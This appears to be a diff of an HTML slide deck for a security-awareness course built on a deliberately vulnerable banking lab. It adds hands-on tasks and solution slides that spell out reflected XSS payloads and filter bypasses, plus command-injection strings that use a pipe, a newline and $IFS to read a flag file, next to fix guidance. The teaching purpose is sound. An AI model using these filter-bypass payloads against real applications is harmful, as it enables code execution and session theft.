 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">Your customers are told to check the domain and the padlock.<br/>In this attack, both are perfect.</p>
 </div></section>
-<section id="s92" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s91" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; Reflected XSS</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">your input as text to display &mdash; not as live code</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;Is everything we echo back to the page treated as text, never as code?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc">the reason you are told <strong>not to click unexpected links</strong> &mdash; one click can hand over a session. Defences: framework auto-escaping, <strong>CSP</strong>, <strong>HttpOnly</strong> cookies and the <strong>Same-Origin Policy</strong></p></div>
+</div>
+</div></section>
+<section id="s92" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Make the Bank&rsquo;s Own Page Run Your Code</h2>
+<div class="yt">
+<div class="grid2 gap2">
+<div>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You made the bank&rsquo;s own page run code of your choosing in a visitor&rsquo;s browser.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have <strong>no information</strong> about what they changed, and about 5 minutes to try.</p></div>
+</div>
+<div>
+<p class="sub mb1">When it works</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
+<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
+</div>
+</div>
+<p class="desc mt2" style="font-size:.85rem;color:var(--t3)">Note: G4 is configured as training-only in the lab, so it will not award points until you enable scoring for it in the instructor panel.</p>
+</div>
+</div></section>
+<section id="s93" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb1">The Fix &mdash; Three Independent Layers</h3>
 <div class="grid3 mt2">
 <div class="card green-left"><h3 style="font-size:1rem;color:var(--green)">1. Encode on output</h3><pre class="mt1" style="padding:.7rem .9rem"><code><span class="kw">echo</span> <span class="fn">htmlspecialchars</span>(
@@ -1226,12 +1294,15 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 </div>
 <div class="card accent-left mt3"><p class="desc"><strong style="color:var(--t1)">The leadership point:</strong> no single control stops this. Encoding is the fix; CSP and HttpOnly are what save you on the day the encoding is missed on one page out of four hundred. <strong>That is what &ldquo;defence in depth&rdquo; actually buys.</strong></p></div>
 </div></section>
-<section id="s93" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<section id="s94" data-phase="Live Labs" class="slide"><div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <div class="card accent-left"><h3 style="color:var(--indigo);font-size:1.02rem">Application Security</h3><p class="desc mt1" style="font-size:.9rem"><strong>Encode on output, everywhere.</strong> One missed echo on one page out of four hundred is enough, which is why this needs to be a framework default rather than developer discipline.</p><p class="desc mt1" style="font-size:.9rem"><strong>Content Security Policy and HttpOnly cookies</strong> are what save you on the day the encoding is missed.</p></div><div class="card accent-left mt2"><h3 style="color:var(--indigo);font-size:1.02rem">Third-Party &amp; Supply Chain</h3><p class="desc mt1" style="font-size:.9rem"><strong>Every third-party script is code you ship but do not control.</strong> Someone must own the inventory, pin the versions, and know what happens when a vendor changes hands.</p></div>
 <p class="mt2 big center" style="font-size:clamp(.95rem,1.6vw,1.2rem)">&ldquo;Who owns the list of JavaScript running on our customer-facing pages &mdash; and when was it last reviewed?&rdquo;</p>
 </div></section>
-<section id="s94" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s95" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><div><div class="sol-cwe">CWE-79 · A03:2021  ·  🎓 training only (no flag)</div><h2 style="margin:.06em 0">Reflected XSS</h2><div class="sol-where">&#128205; /statements — search term reflection</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Run attacker JavaScript in the victim's browser via a reflected value.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The search term is reflected back into the page <b>without encoding</b>, so markup you send becomes part of the page and executes. Which encoding is missing depends on <b>where</b> it's reflected — text vs. an HTML attribute.</p><div class="sol-note"><strong>Note.</strong> Not part of the CTF (<code>ctf_eligible=false</code>) — no flag. At L0 the session cookie has <b>no HttpOnly</b>, so <code>document.cookie</code> includes it — use that to demo cookie theft.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">reflected raw into text</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">naive &lt;script&gt; strip — use handlers/nesting</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">text encoded, attribute raw — break out</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">both contexts encoded</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> <code>htmlspecialchars()</code> on <b>both</b> the text and the attribute reflections; the payload can't break out of either context, so nothing executes.</p></div></div></div></div></section>
+<section id="s96" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Naive &lt;script&gt; strip</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">A single-pass strip removes literal <code>&lt;script&gt;</code>/<code>&lt;/script&gt;</code>, so a plain script tag never fires.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Don't use a script tag — use an event handler, or nest the tag so one strip rebuilds it.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">&lt;img src=x onerror=alert(1)&gt;   ·   &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</div><div class="sol-paynote">event handler needs no &lt;script&gt;</div></div></section>
+<section id="s97" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Text encoded, attribute raw</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>&lt;&gt;</code> are now encoded in the <b>text</b> sink — but the search box <code>value="…"</code> reflects your input <b>raw</b>. The text payload is inert here; the attribute is the vector.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Break out of the attribute first with <code>"&gt;</code>, then inject your tag.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">"&gt;&lt;img src=x onerror=alert(1)&gt;</div><div class="sol-paynote">close the value=" then add markup</div></div></section>
+<section id="s98" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">Polyfill.io, 2024 &mdash; 100,000 websites, one borrowed script</h2>
 <div class="rw mt2">
@@ -1241,33 +1312,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <div class="card yellow-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">What the regulator charged &mdash; British Airways</h3><p class="desc mt1" style="font-size:.88rem">A near-identical technique &mdash; injected JavaScript skimming the payment page for 15 days, around <strong>429,000 customers</strong> &mdash; drew a proposed <strong>&pound;183 million</strong> penalty, finally settled at <strong>&pound;20 million</strong>. Client-side code is in regulatory scope.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> do we have an inventory of every third-party script running on our customer-facing pages &mdash; and who is accountable when one of them changes owner?</p></div>
 </div></section>
-<section id="s95" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G4 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Make the Bank&rsquo;s Own Page Run Your Code</h2>
-<div class="yt">
-<div class="grid2 gap2">
-<div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">The search box reflects whatever you type back into the page. At this level a plain &lt;script&gt; tag is filtered out. Find another way to get JavaScript to execute &mdash; prove it by making the page pop an alert, or by reading your own session cookie.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">A bare script tag is not the only way to run code &mdash; HTML tags carry event handlers too.<br/>An image pointing at a broken URL has to do something when it fails to load.<br/>If the word &ldquo;script&rdquo; is stripped but angle brackets survive, try changing the case or splitting the word.<br/>Execution is the goal, not damage. An alert box is proof enough.</p>
-</div>
-<div>
-<p class="sub mb1">When it works</p>
-<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
-<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
-</div>
-</div>
-<p class="desc mt2" style="font-size:.85rem;color:var(--t3)">Note: G4 is configured as training-only in the lab, so it will not award points until you enable scoring for it in the instructor panel.</p>
-</div>
-</div></section>
-<section id="s96" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><div><div class="sol-cwe">CWE-79 · A03:2021  ·  🎓 training only (no flag)</div><h2 style="margin:.06em 0">Reflected XSS</h2><div class="sol-where">&#128205; /statements — search term reflection</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Run attacker JavaScript in the victim's browser via a reflected value.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The search term is reflected back into the page <b>without encoding</b>, so markup you send becomes part of the page and executes. Which encoding is missing depends on <b>where</b> it's reflected — text vs. an HTML attribute.</p><div class="sol-note"><strong>Note.</strong> Not part of the CTF (<code>ctf_eligible=false</code>) — no flag. At L0 the session cookie has <b>no HttpOnly</b>, so <code>document.cookie</code> includes it — use that to demo cookie theft.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">reflected raw into text</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">naive &lt;script&gt; strip — use handlers/nesting</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">text encoded, attribute raw — break out</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">both contexts encoded</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> <code>htmlspecialchars()</code> on <b>both</b> the text and the attribute reflections; the payload can't break out of either context, so nothing executes.</p></div></div></div></div></section>
-<section id="s97" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Raw reflection into text</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The term is echoed straight into the “Results for:” line, unencoded.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Any tag runs. Use an image error handler (fires without a visible element).</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">&lt;img src=x onerror=alert(document.domain)&gt;</div><div class="sol-paynote">&lt;script&gt;alert(1)&lt;/script&gt; also works</div></div></section>
-<section id="s98" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Naive &lt;script&gt; strip</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">A single-pass strip removes literal <code>&lt;script&gt;</code>/<code>&lt;/script&gt;</code>, so a plain script tag never fires.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Don't use a script tag — use an event handler, or nest the tag so one strip rebuilds it.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">&lt;img src=x onerror=alert(1)&gt;   ·   &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</div><div class="sol-paynote">event handler needs no &lt;script&gt;</div></div></section>
-<section id="s99" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G4</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Text encoded, attribute raw</h2><span class="sol-where" style="margin-left:auto">Reflected XSS</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc"><code>&lt;&gt;</code> are now encoded in the <b>text</b> sink — but the search box <code>value="…"</code> reflects your input <b>raw</b>. The text payload is inert here; the attribute is the vector.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Break out of the attribute first with <code>"&gt;</code>, then inject your tag.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">"&gt;&lt;img src=x onerror=alert(1)&gt;</div><div class="sol-paynote">close the value=" then add markup</div></div></section>
-<section id="s100" data-phase="Live Labs" class="slide">
+<section id="s99" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <div class="flex-row mb2">
 <span class="badge badge-red">&#128308; Demo 8</span>
@@ -1277,7 +1322,7 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
 <p class="big mt2">"We're going to take control of the server. From a PDF download button."</p>
 </div>
 </section>
-<section id="s101" data-phase="Live Labs" class="slide">
+<section id="s100" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">The Normal Flow</h3>
 <p class="desc">The Statements page has an <strong style="color:var(--t1)">"Export PDF"</strong> feature. It takes a filename and passes it to a command-line tool that generates the PDF.</p>
@@ -1286,7 +1331,7 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p class="desc mt2">The filename — <code>statement.pdf</code> — comes from the request. The developer assumed it would always be a simple filename. It isn't.</p>
 </div>
 </section>
-<section id="s102" data-phase="Live Labs" class="slide">
+<section id="s101" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">Step 1: Discovery</h3>
 <p class="desc">We change the filename to include a <strong style="color:var(--red)">shell metacharacter</strong>:</p>
@@ -1298,7 +1343,7 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p class="desc mt2">Instead of a PDF, the server returns a <strong style="color:var(--t1)">directory listing</strong>. We can see every file on the server's temp directory — including a suspicious file called <code style="color:var(--amber)">flag_g9_1.txt</code>.</p>
 </div>
 </section>
-<section id="s103" data-phase="Live Labs" class="slide">
+<section id="s102" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">Step 2: Extraction</h3>
 <p class="desc">Now we read the flag file:</p>
@@ -1312,7 +1357,7 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p class="big mt2 center">"We just ran arbitrary commands on the server.<br/>From a PDF download button. In a banking app."</p>
 </div>
 </section>
-<section id="s104" data-phase="Live Labs" class="slide">
+<section id="s103" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">The Vulnerable Code</h3>
 <pre><code><span class="cm">// VULNERABLE: user-supplied filename concatenated into shell command</span>
@@ -1320,13 +1365,44 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p class="mt2 desc"><span class="vuln-hl">$filename</span> — whatever the user sends in the request becomes part of the command line. Shell metacharacters (<code>;</code> <code>|</code> <code>`</code> <code>$()</code>) break out of the intended command and execute whatever the attacker wants.</p>
 </div>
 </section>
-<section id="s105" data-phase="Live Labs" class="slide"><div class="slide-inner center">
+<section id="s104" data-phase="Live Labs" class="slide"><div class="slide-inner center">
 <h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">We asked the bank for a PDF.<br/>It handed us the server.</h1>
 <div class="sep" style="max-width:200px;margin:2rem auto"></div>
 <p class="big" style="color:var(--t2)">Every other attack today stayed inside the application.<br/>This one stepped outside it &mdash; onto the operating system the application runs on.</p>
 <p class="mt3 desc">From here an attacker reads files, reaches other systems on the network,<br/>installs persistence, and deletes the logs that would have shown any of it.</p>
 </div></section>
-<section id="s106" data-phase="Live Labs" class="slide">
+<section id="s105" data-phase="Live Labs" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128161; Security Mindset</span><span style="color:var(--t3);font-size:.8rem">G9 &bull; Command injection</span></div>
+<h2 class="mb2">That worked. <span style="color:var(--amber)">Here is the thinking that stops it.</span></h2>
+<p class="desc mb2">To the business this looked like normal functionality. The gap was never a typo &mdash; it was a piece of trust nobody noticed they had placed.</p>
+<div class="grid3 gap2">
+<div class="card red-left"><p class="sub mb1" style="color:var(--red)">The app trusted</p><p class="desc">your input as part of the shell command line</p></div>
+<div class="card accent-left"><p class="sub mb1">Ask your team</p><p class="desc">&ldquo;Does user input ever reach a shell &mdash; and if it did, how far could it go?&rdquo;</p></div>
+<div class="card green-left"><p class="sub mb1" style="color:var(--green)">And that&rsquo;s why you now have</p><p class="desc">frameworks that <strong>never build shell strings</strong> &mdash; arguments passed as a list, so input cannot become a command &mdash; plus least-privilege, sandboxed/containerised runtimes</p></div>
+</div>
+</div></section>
+<section id="s106" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
+<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G9 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
+<h2 class="mb2">Run a Command on the Server</h2>
+<div class="yt">
+<div class="grid2 gap2">
+<div>
+<p class="sub mb1">The finding you reported</p>
+<p class="desc">You ran a command of your own on the bank&rsquo;s server.</p>
+<div class="card red-left mt2" style="padding:.6rem .9rem"><p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">Now retest the fix.</strong> You reported this finding; the developers have since shipped a fix. Confirm whether it actually holds &mdash; you have <strong>no information</strong> about what they changed, and about 5 minutes to try.</p></div>
+</div>
+<div>
+<p class="sub mb1">When it works</p>
+<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
+<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
+<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
+<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
+</div>
+</div>
+
+</div>
+</div></section>
+<section id="s107" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">The Fix — Two Layers</h3>
 <div class="vs">
@@ -1360,7 +1436,7 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p class="big center">Whitelist first. Escape as a safety net. Both together is best.</p>
 </div>
 </section>
-<section id="s107" data-phase="Live Labs" class="slide">
+<section id="s108" data-phase="Live Labs" class="slide">
 <div class="slide-inner">
 <h3 class="mb2">Who Should Have Caught This?</h3>
 <p class="desc mb2">When Application Security misses a command injection, which other layers should catch it?</p>
@@ -1377,7 +1453,10 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <p class="mt2 big center">"Security is layers. When one fails, the next should catch it."</p>
 </div>
 </section>
-<section id="s108" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
+<section id="s109" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G9</span><div><div class="sol-cwe">CWE-78 · A03:2021</div><h2 style="margin:.06em 0">Command Injection</h2><div class="sol-where">&#128205; /statements — Download PDF</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Run OS commands as <code>www-data</code> (RCE) and read the flag file.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The Download-PDF control shells out to <code>wkhtmltopdf</code> with your <b>output filename unescaped</b>. Shell metacharacters in the filename start new commands. <i>(Runs in an emulated honeypot shell — no real host access, no egress.)</i></p><div class="sol-note"><strong>Note.</strong> The flag file is per-user: <code>/tmp/flag_g9_&lt;id&gt;.txt</code>. <code>id</code> → uid=33(www-data); <code>ls /tmp</code> finds the filename.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw — ';' chains commands</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">blacklist ; & — use the pipe</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">blacklist ; & | + spaces — newline + $IFS</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">escapeshellarg() on every arg</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> <code>escapeshellarg()</code> wraps every argument, so <code>;</code>, <code>|</code>, newline and <code>$IFS</code> are all treated as literal filename characters — a real PDF is returned and nothing breaks out.</p></div></div></div></div></section>
+<section id="s110" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G9</span><h2 class="sol-lvlbadge l1" style="margin:0">L1 &mdash; Blacklist: ; &amp;</h2><span class="sol-where" style="margin-left:auto">Command Injection</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">The filter strips <code>;</code> and <code>&amp;</code>, so <code>statement.pdf;cat…</code> collapses into one broken token.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Use a separator the blacklist forgot — the pipe survives.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">filename=statement.pdf|cat /tmp/flag_g9_&lt;id&gt;.txt</div><div class="sol-paynote">| was not on the list</div></div></section>
+<section id="s111" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G9</span><h2 class="sol-lvlbadge l2" style="margin:0">L2 &mdash; Blacklist: ; &amp; | + spaces</h2><span class="sol-where" style="margin-left:auto">Command Injection</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Now <code>;</code>, <code>&amp;</code>, <code>|</code> and <b>spaces</b> are all stripped — the pipe is gone and no space survives.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Separate commands with a raw <b>newline</b> (<code>%0a</code>) and make a space without typing one, using <code>$IFS</code>.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">filename=statement.pdf%0acat$IFS/tmp/flag_g9_&lt;id&gt;.txt</div><div class="sol-paynote">also ${IFS}, $IFS$9, %09, {cat,/path}</div></div></section>
+<section id="s112" data-phase="Live Labs" data-kind="real" class="slide"><div class="slide-inner">
 <span class="rw-tag">&#9888; This actually happened</span>
 <h2 class="mt2 mb1">Ivanti, 2024 &mdash; command injection, and a 48-hour evacuation order</h2>
 <div class="rw mt2">
@@ -1387,32 +1466,16 @@ wkhtmltopdf /tmp/source.html /tmp/<span class="str">statement.pdf</span></code><
 <div class="card red-left mt2" style="padding:.9rem 1.2rem"><h3 style="font-size:.95rem">What it costs when the patch waits &mdash; Equifax</h3><p class="desc mt1" style="font-size:.88rem">The same bug class, left unpatched for two months on an internet-facing server: <strong>147.9 million</strong> people&rsquo;s records, <strong>76 days</strong> of undetected access, <strong>$700M+</strong> in settlements, and the exit of the chief executive, CIO and security chief.</p></div>
 <div class="card accent-left mt2" style="padding:.9rem 1.2rem"><p class="desc" style="font-size:.92rem"><strong style="color:var(--t1)">Leadership question:</strong> if we were told tonight to disconnect a core security appliance within 48 hours, could we &mdash; and what would stop working?</p></div>
 </div></section>
-<section id="s109" data-phase="Live Labs" data-kind="handson" class="slide"><div class="slide-inner">
-<div class="flex-row mb2"><span class="badge badge-yellow">&#128993; Your Turn</span><span style="color:var(--t3);font-size:.8rem">G9 &bull; Level 1 or 2 &bull; 5 minutes</span></div>
-<h2 class="mb2">Run a Command on the Server</h2>
-<div class="yt">
-<div class="grid2 gap2">
-<div>
-<p class="sub mb1">Your objective</p>
-<p class="desc">The export filename is injectable. At this level the simple separators you saw in the demo are stripped. Find another way to chain a command and read your flag file.</p>
-<p class="sub mb1 mt2">If you get stuck</p>
-<p class="desc" style="font-size:.88rem">The demo used <code>;</code> &mdash; what other characters can separate or chain shell commands?<br/>Spaces may be filtered. Shells have more than one way to express a space.<br/>Your goal is to read <code>/tmp/flag_g9_&lt;your-id&gt;.txt</code> &mdash; get its contents onto the page.</p>
+<section id="s113" data-phase="The Chain" class="slide"><div class="slide-inner center">
+<p class="sub mb1">Pause &mdash; before we connect the dots</p>
+<h2 class="mb2">What did that stir up?</h2>
+<div class="grid3 mt2" style="gap:1rem;text-align:left">
+<div class="card accent-left"><h3 style="font-size:1rem">In your world</h3><p class="desc mt1" style="font-size:.9rem">Which of these eight felt closest to something in your own systems &mdash; a feature you would have signed off without a second thought?</p></div>
+<div class="card accent-left"><h3 style="font-size:1rem">The sentence</h3><p class="desc mt1" style="font-size:.9rem">Where, in your last few meetings, did you hear a <em>reasonable</em> sentence quietly doing the job of a security control?</p></div>
+<div class="card accent-left"><h3 style="font-size:1rem">The decision</h3><p class="desc mt1" style="font-size:.9rem">Think of a &ldquo;go live now, test later&rdquo; call you have made. Would you make it the same way after this?</p></div>
 </div>
-<div>
-<p class="sub mb1">When it works</p>
-<div class="step"><div class="step-num">1</div><div><p class="desc">The app reveals a <strong>flag</strong> &mdash; <code>BANKSPLOIT{...}</code></p></div></div>
-<div class="step"><div class="step-num">2</div><div><p class="desc">Hit <strong>Claim</strong>, or paste it into Submit Flag</p></div></div>
-<div class="step"><div class="step-num">3</div><div><p class="desc">Your points land on the leaderboard</p></div></div>
-<button class="timer-btn mt2" onclick="timerStart(300)">&#9654; Start 5:00 timer</button>
-</div>
-</div>
-
-</div>
+<p class="big center mt3" style="font-size:clamp(.95rem,1.5vw,1.15rem);color:var(--t2)">Take thirty seconds &mdash; turn to the person next to you. What is one example from your own world?</p>
 </div></section>
-<section id="s110" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G9</span><div><div class="sol-cwe">CWE-78 · A03:2021</div><h2 style="margin:.06em 0">Command Injection</h2><div class="sol-where">&#128205; /statements — Download PDF</div></div></div><div class="grid2 mt2"><div><p class="sub mb1">Goal</p><p class="desc">Run OS commands as <code>www-data</code> (RCE) and read the flag file.</p><p class="sub mb1 mt3">Root cause</p><p class="desc">The Download-PDF control shells out to <code>wkhtmltopdf</code> with your <b>output filename unescaped</b>. Shell metacharacters in the filename start new commands. <i>(Runs in an emulated honeypot shell — no real host access, no egress.)</i></p><div class="sol-note"><strong>Note.</strong> The flag file is per-user: <code>/tmp/flag_g9_&lt;id&gt;.txt</code>. <code>id</code> → uid=33(www-data); <code>ls /tmp</code> finds the filename.</div></div><div><p class="sub mb1">Level ladder</p><div class="sol-ladder"><div class="sol-lrow"><span class="sol-lk">L0</span><span class="sol-lv">raw — ';' chains commands</span></div><div class="sol-lrow"><span class="sol-lk">L1</span><span class="sol-lv">blacklist ; & — use the pipe</span></div><div class="sol-lrow"><span class="sol-lk">L2</span><span class="sol-lv">blacklist ; & | + spaces — newline + $IFS</span></div><div class="sol-lrow"><span class="sol-lk">L3</span><span class="sol-lv">escapeshellarg() on every arg</span></div></div><div class="card green-left mt3"><p class="desc" style="font-size:1rem"><b>L3 — secure:</b> <code>escapeshellarg()</code> wraps every argument, so <code>;</code>, <code>|</code>, newline and <code>$IFS</code> are all treated as literal filename characters — a real PDF is returned and nothing breaks out.</p></div></div></div></div></section>
-<section id="s111" data-phase="Live Labs" class="slide"><div class="slide-inner"><div class="sol-head"><span class="sol-tag">G9</span><h2 class="sol-lvlbadge l0" style="margin:0">L0 &mdash; Raw — semicolon chaining</h2><span class="sol-where" style="margin-left:auto">Command Injection</span></div><div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">Nothing filtered; the filename goes straight to the shell.</p></div><div><p class="sub mb1">How to solve it</p><p class="desc">Chain commands with <code>;</code>.</p></div></div><p class="sub mb1 mt3">Payload</p><div class="sol-pay">filename=statement.pdf;cat /tmp/flag_g9_&lt;id&gt;.txt;</div><div class="sol-paynote">prove RCE first with ;id;</div></div></section>
